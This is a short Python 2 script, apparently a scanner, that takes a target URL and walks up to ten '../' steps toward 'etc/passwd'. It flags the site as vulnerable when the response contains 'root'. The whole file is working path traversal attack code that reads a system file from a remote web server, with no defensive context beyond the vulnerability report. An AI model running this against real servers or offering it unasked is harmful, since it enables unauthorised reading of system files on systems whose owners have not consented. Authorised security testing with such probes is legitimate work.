import sys
import urllib2
import getopt
import time

target = ''
depth = 10
file = 'etc/passwd'

html = ''
prefix = ''
url = ''

def usage():
		print "usage function"


try:
		opts,args = getopt.getopt(sys.argv[1:],"ht:",["help","target="])
		for opt, arg in opts:
			if opt in("-h","--help"):
				usage()
				sys.exit()
			if opt in("-t","--target"):
				target = arg
				if not target.startswith('http://', 0, 7): 
						target = 'http://' + target
except getopt.GetoptError:
		usage()
		sys.exit(2)


for i in range(1,depth+1):
		prefix += '../'
		url = target + prefix + file
		print "Testing: ",url
		try:
				response = urllib2.urlopen(url)
				html = response.read()
		except:
				pass
		if("root" in html):
				print url, " is Vulnerable"
				break
		else:
				time.sleep(2)
				continue
